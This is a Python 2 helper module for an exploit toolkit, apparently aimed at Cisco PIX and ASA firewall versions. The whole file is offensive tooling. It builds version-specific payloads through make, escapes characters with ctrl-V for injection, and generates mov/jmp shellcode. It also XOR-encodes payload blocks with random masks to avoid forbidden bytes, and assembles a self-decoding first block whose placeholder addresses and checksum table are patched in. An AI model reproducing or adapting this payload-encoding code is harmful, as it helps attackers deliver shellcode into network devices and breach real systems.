from binascii import *
from hexdump import *
import random
import subprocess

# utility routines for the payload code


# magic control bytes
CTRL_V    = "\x16"
OVERWRITE = "\x0f"
KILL      = "\x15"
YANK      = "\x19"
LINEFEED  = "\x0a"
NEXT      = "\x0e"
PREV      = "\x10"

MAX_BLOCK_SIZE = 510

def build_version(params):
    memsize = params.target_memory
    version = params.target_vers
    payload = params.payload
    versdir = params.versdir
    
    print "building versions files for memory %s, payload %s, and version %s" % (memsize, payload, version)

    # run "make x" for each item in list, in the versions dir
    for t in ("clean", memsize, version):
        if t == version:
            if version.find("pix") == 0 and payload.find("BM") == 0:
                cmd = "make %s PAYLOAD=%s_%s" % (version, memsize, payload)
            elif version.find("asa7") == 0 and payload.find("BM") == 0:
                cmd = "make %s PAYLOAD=%s_%s" % (version, memsize, payload)
            else:
                cmd = "make %s PAYLOAD=%s" % (version, payload)
        else:
            cmd = "make %s" % t
        print cmd
        try:
            subp = subprocess.Popen(cmd,
                                    cwd=versdir,
                                    shell=True)
            retval = subp.wait()
            if retval > 0:
                print "problem with \"%s\" in versions" % cmd
                return False
        except OSError, e:
            print "OSError: " + str(e)
            return False
        except Exception, e:
            print "Exception: " + str(e)
            return False

    return True


# insert ctrl-v chars before every char in string
def ctrl_v_escape(string):
    new_string = ""

    for c in string:
        new_string += CTRL_V + c

    return(new_string)


# 4-byte value byte reversal
def byterev(addr):
    return(addr[3] + addr[2] + addr[1] + addr[0])

# convert target address string to little endian word
def wordify(addr_str):
    return(byterev(unhexlify(addr_str)))


# wrap addr in opcodes:
#   mov $addr, %ecx    ; b9 <addr>
#   jmp *%ecx          ; ff e1
# this done away with?
def ecx_jmp(addr):
    return("\xb9" + addr + "\xff\xe1")


def forbidden_bytes(payload):
    for p in payload:
        if ord(p) == 0x00:
            return(True)
        if ord(p) == 0x0a:
            return(True)
        if ord(p) == 0x0d:
            return(True)
        if ord(p) == 0x7f:
            return(True)
        if ord(p) == 0xfb:
            return(True)

    return(False)


def rand_byte():
    return(chr(random.randint(0, 255)))


def scramble(data, mask):
    new_data = ""
    
    for d in data:
        new_data += chr(ord(d) ^ mask)

    return(new_data)


def compute_checksum(block):
    cksum = 0

    for b in block:
        cksum ^= ord(b)

    return(cksum)


# compute a WRONG, INCORRECT checksum, for testing
def compute_checksum_badly(block):
    # introduce a subtle flaw to the answer
    cksum = compute_checksum(block) ^ 0xa5

    return(cksum)


#
# encode all blocks of payload with different masks
# compute checksums of blocks before encoding
# construct all encoded blocks and return them
#   including fixing up the table of block addr/len/cksum
#
# this is a bit insane, parameter-wise
# but I want this part version-indep if possible
#
# this code is the nasty
#
def prepare_blocks(params, mask_byte,
                   block1_decoder, cleanup, block_decoder, blocks_table, epba_exit,
                   free_addrs, block, scramble_blks=range(2,14)):
    # start with empties for blocks 0, 1
    block_enc = ["", ""]
    mask_bytes = ["", ""]
    block_cksum = ["", ""]

    # transform block[N] into block_enc[N], for 2..14
    for b in range(2, len(block)):
        if (len(block[b]) > MAX_BLOCK_SIZE):
            print "block %d is too large! (size = %d)" % (b, len(block[b]))
            return(False)

        if b in scramble_blks:
            done = False
            block_cksum.append(compute_checksum(block[b]))
            while not done:
                block_mask_byte = ord(rand_byte())  # one byte, used as an int
                #print "block " + str(b) + " mask 0x%02x" % block_mask_byte

                encoded = scramble(block[b], block_mask_byte)
                if not forbidden_bytes(encoded):
                    done = True
                #else:
                    #print "forbidden bytes found in encoded block[%d], try again" % b

            block_enc.append(encoded)
            mask_bytes.append(block_mask_byte)
        else:
            if forbidden_bytes(block[b]):
                print "Forbidden bytes in not-scrambled block %d" % b
                return False
            block_enc.append(block[b])
            mask_bytes.append("")

    # start building block1

    # the body does cleanup, decodes blocks, then calls payload, exits on return
    body = cleanup + block_decoder + epba_exit

    # create real blocks table (no longer using original blocks_table)
    new_blocks_table = ""
    for b in range(2, 14):
        # addr
        new_blocks_table += free_addrs[b]

        # len, cksum, mask
        stuff = "%02x%02x%02x%02x" % ( ((len(block_enc[b]) & 0xff00) >> 8),
                                       (len(block_enc[b]) & 0xff),
                                       block_cksum[b],
                                       mask_bytes[b] )
        new_blocks_table += unhexlify(stuff)

    # compute addr where table is tacked onto end of body
    base = int(hexlify(byterev(free_addrs[1])), 16)
    table_addr = base + len(block1_decoder) + len(body)
    table_addr = "%08x" % table_addr

    # append the table, will be found at table_addr
    body += new_blocks_table

    # fix addr in decode/checksum loop for start of the blocks table
    body = body.replace(unhexlify("c0edbabe"), byterev(unhexlify(table_addr)), 1)

    # now scramble the body
    block1_body = scramble(body, mask_byte)

    if forbidden_bytes(block1_body):
        print "forbidden bytes found in encoded block[1], try again"
        return([])

    # build and fix up the block1 decoder
    b1_decod = block1_decoder
    b1_decod = b1_decod.replace(unhexlify("c0edbabe"), free_addrs[1], 1)
    b1_decod = b1_decod.replace(unhexlify("deadbeef"),
                                byterev(unhexlify(("%08x" % (len(block1_body) ^ 0xaaaaaaaa)))),
                                1)
    i = block1_decoder.rfind("\xaa")
    b1_decod = b1_decod[0:i] + chr(mask_byte) + b1_decod[i+1:]

    # block one is now decoder plus encoded body
    block_enc[1] = b1_decod + block1_body

    # too much?
    if (len(block_enc[1]) > MAX_BLOCK_SIZE):
        print "block %d is too large! (size = %d)" % (1, len(block_enc[1]))
        return(False)

    # done, show me what I done
    if params.verbose:
        print "mask bytes: ",
        print "b%d:%02x;" % (1, mask_byte),
        for x in scramble_blks:
            print "b%d:%02x;" % (x, mask_bytes[x]),
        print

    if params.verbose:
        print "cksums: ",
        for x in scramble_blks:
            print "b%d:%02x;" % (x, block_cksum[x]),
        print

    if params.debug:
        for b in range(0, len(block_enc)):
            print "@%s: block_enc[%d] (%d b) = " % (hexlify(byterev(free_addrs[b])), b, len(block_enc[b]))
            hexdump(block_enc[b], 16)
            print

    return block_enc
